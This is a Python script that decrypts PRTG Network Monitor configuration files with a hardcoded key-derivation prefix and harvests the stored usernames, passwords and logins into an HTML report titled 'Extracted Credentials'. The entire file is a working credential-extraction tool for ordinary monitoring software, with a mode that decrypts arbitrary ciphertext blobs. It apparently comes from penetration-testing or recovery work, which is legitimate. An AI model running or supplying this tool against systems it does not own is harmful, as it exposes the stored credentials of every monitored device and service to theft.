from argparse import ArgumentParser, FileType
import re
from lxml import etree
from collections import defaultdict
import argparse
import os
from html import escape

def generate_html(results, output_file):
    # group by columns
    groups = defaultdict(list)
    for path, valuables in results:
        colset = frozenset(valuables.keys())
        groups[colset].append((path, valuables))

    html = [
        "<!DOCTYPE html>",
        "<html><head><meta charset='utf-8'>",
        "<style>",
        "body { font-family: Arial, sans-serif; margin: 20px; }",
        "h2 { margin-top: 40px; }",
        "table { border-collapse: collapse; margin-bottom: 30px; table-layout: auto; }",
        "th, td { border: 1px solid #ccc; padding: 6px 12px; text-align: left; max-width: 600px; word-wrap: break-word; }",
        "th { background: #f2f2f2; }",
        "tr:nth-child(even) { background: #fafafa; }",
        "</style>",
        "</head><body>",
        "<h1>Extracted Credentials</h1>",
    ]

    for colset, entries in groups.items():
        colnames = list(colset)

        # ordering: user first, pass second, then rest
        user_cols = [c for c in colnames if "user" in c.lower()]
        pass_cols = [c for c in colnames if "pass" in c.lower()]
        other_cols = sorted(c for c in colnames if c not in user_cols + pass_cols)

        ordered_cols = user_cols + pass_cols + other_cols

        html.append("<table>")
        html.append("<tr>" + "".join(f"<th>{escape(col)}</th>" for col in ordered_cols) + "</tr>")

        for path, valuables in entries:
            row = []
            for col in ordered_cols:
                val = valuables.get(col, "")
                val_html = escape(val).replace("\n", "<br>")
                if "comment" in col.lower() and len(val) > 30:
                    display_val = escape(val[:30] + "...")
                    cell = f"<td title='{escape(val)}'>{display_val}</td>"
                else:
                    cell = f"<td>{val_html}</td>"
                row.append(cell)
            html.append("<tr>" + "".join(row) + "</tr>")



        html.append("</table>")

    html.append("</body></html>")

    with open(output_file, "w", encoding="utf-8") as f:
        f.write("\n".join(html))

    print(f"[+] HTML report written to {os.path.abspath(output_file)}")

def decrypt_xml_node(node, cipher):
    """
    Recursively decrypt XML node text if a 'crypt' attribute is present.
    Handles <cell crypt="..."> and <item crypt="..."> structures.
    """
    # If this node itself has 'crypt', decrypt its text if it exists
    if node.get("crypt") and node.text and cipher:
        try:
            node.text = cipher.decrypt(node.text.strip(), decode=True)
        except Exception as e:
            pass

    # If <item crypt="...">, you might want to decrypt specific child nodes, e.g., <text>
    if node.tag.lower() == "item" and node.get("crypt") and cipher:
        text_child = node.find("text")
        if text_child is not None and text_child.text:
            try:
                text_child.text = cipher.decrypt(text_child.text.strip(), decode=True)
            except Exception as e:
                pass

    # Recurse for children
    for child in node:
        decrypt_xml_node(child, cipher)

def extract_valuables(xml_file):
    tree = etree.parse(xml_file)
    root = tree.getroot()
    guid = root.get('guid')
    cipher = PaeCipherAES256(guid=guid)

    seen = set()
    results = []

    def get_inherited_value(node, tagname):
        """Walk up parents until a value for tagname is found inside their <data> section, with debug output."""
        parent = node.getparent()
        # if node is inside a <data> element, jump to its parent container
        if parent is not None and parent.tag.lower() == "data":
            parent = parent.getparent()

        while parent is not None:
            # build a readable path for debug
            path = []
            temp = parent
            while temp is not None:
                path.insert(0, temp.tag)
                temp = temp.getparent()
            path_str = "/".join(path)

            data_section = parent.find("data")
            if data_section is not None:
                match = data_section.find(tagname)
                if match is not None:
                    val = extract_value(match)
                    if val is not None:
                        return val
            parent = parent.getparent()

        return None

    def extract_value(node):
        """Extract value from node or its <cell> children, decrypting if needed."""
        values = []

        # handle multiple <cell> children
        for cell in node.findall("cell"):
            text = cell.text.strip() if cell.text else ""
            if text and cell.get("crypt") and cipher:
                # decrypt if 'crypt' attribute exists
                text = cipher.decrypt(text, decode=True)
            if text:
                values.append(text)

        # fallback to node text if no cells or no text extracted
        if not values and node.text and node.text.strip():
            values.append(node.text.strip())

        # join multiple cells with a space (or any separator you prefer)
        return "\n".join(values)

    def has_inherited_flag(node):
        """Check if node has <flags><inherited/>."""
        flags = node.find("flags")
        if flags is not None and flags.find("inherited") is not None:
            return True
        return False


    def recurse(node, path=[]):
        if node.tag.lower() == "history":
            return

        path = path + [node.tag]

        # collect valuables from this node's children
        valuables = {}
        valuables_list = ["user", "pass", "login", "comment", "name"]
        blacklist = ["usersettings","paessler-mqtt-credentials-user_credentials-active",
                     "paessler-opcua-credentials-user_authentication-user_auth_mode",
                     "mqtt_user_credentials", "linuxloginmode",
                     "trafficportname", "paessler-rest-authentication_section-authentication_group-login_auth_method",
                     "paessler-rest-authentication_section-authentication_group-login_request_method",
                     "paessler-rest-authentication_section-authentication_group-login_result_type",
                     "updateportname", "usertype", "podlogintype", "lastlogin"]

        for child in node:
            tag = child.tag.lower()
            if tag in blacklist:
                continue
            if any(keyword in tag for keyword in valuables_list):
                value = extract_value(child)

                if value == "" and has_inherited_flag(child):
                    value = get_inherited_value(child, child.tag)

                if value is not None and len(value) > 0:
                    valuables[tag] = value

        # if we found multiple valuables under the same parent: they belong together
        if valuables and any("pass" in key.lower() for key in valuables):
            entry = ("/".join(path), valuables)
            hashable_entry = ("/".join(path), frozenset(valuables.items()))
            if hashable_entry not in seen:
                results.append(entry)     # keep the nice dict in results
                seen.add(hashable_entry)  # store a hashable version in seen
            
        # keep recursing down
        for child in node:
            recurse(child, path)

    recurse(root)
    return results

def main() -> None:
    entrypoint = ArgumentParser()
    parsers = entrypoint.add_subparsers(dest='command', required=True)
    parser = parsers.add_parser('file')
    parser.add_argument('path', type=FileType(mode='r'), default='-')
    parser.add_argument("-o", "--output", required=True, help="Path to output file")
    parser.add_argument("--html", action="store_true", help="Generate HTML output with valuable info")
    parser = parsers.add_parser('blob')
    parser.add_argument('data')
    parser.add_argument('-g', '--guid', required=True)
    opts = entrypoint.parse_args()
    if opts.command == 'file':
        if opts.html:
            creds = extract_valuables(opts.path)
            generate_html(creds, opts.output)
        else:
            tree = etree.parse(opts.path)
            root = tree.getroot()
            guid = root.get('guid')
            cipher = PaeCipherAES256(guid=guid)
            decrypt_xml_node(root, cipher)
            tree.write(opts.output, encoding="utf-8", xml_declaration=True, pretty_print=True)

    elif opts.command == 'blob':
        content = opts.data
        cipher = PaeCipherAES256(guid=opts.guid)
        print(re.sub(r'([A-Z0-9]+={1,10})', lambda m: replacer(cipher, m), content))
    else:
        raise RuntimeError('unreachable')


def replacer(cipher: 'PaeCipherAES256', match: re.Match) -> str:
    ciphertext = match.group(1)
    try:
        plaintext = cipher.decrypt(ciphertext, decode=True)
        # dont know why this happens, but it does
        if plaintext == ciphertext:
            return f'ENCRYPTED:{ciphertext}'
        return f'DECRYPTED:{plaintext or ''}'
    except Exception as e:
        return f'FAILED:{e.__class__.__name__}'


# code below copied from https://github.com/yobabyte/decryptocollection/blob/9eb8188a869745931c164d297b1fbfaf17cbd9db/prtg/prtg_string_decryptor.py

from Crypto.Cipher import AES

from base64 import b32decode
from hashlib import sha256


class PaeCipher:
    _TEXT_ENCODINGS = ('ascii', )

    @property
    def key(self):
        return self._derive_key()

    def decrypt(self, data, decode=True):
        decrypted = self._decrypt_impl(data)
        if decode:
            for encoding in self._TEXT_ENCODINGS:
                try:
                    return decrypted.decode(encoding)
                except:
                    pass
        else:
            return decrypted

    def _derive_key(self):
        raise NotImplementedError()

    def _decrypt_impl(self, data):
        raise NotImplementedError()


class PaeCipherAES256(PaeCipher):
    _KEY_PREFIX = '{FAE6C904-D2CC-453E-81E2-B6D3CFD69B92}'
    _TEXT_ENCODINGS = ('UTF-8', 'UTF-16LE')

    def __init__(self, guid, salt=''):
        self.guid = guid
        self.salt = salt or ''

    def _derive_key(self):
        return sha256((self._KEY_PREFIX + self.guid + self.salt).encode()).digest()

    def _decrypt_impl(self, data):
        data = b32decode(data)
        iv = data[:16]
        ct = data[16:]
        cipher = AES.new(self.key, AES.MODE_OFB, iv=iv)
        return cipher.decrypt(ct)


if __name__ == '__main__':
    main()
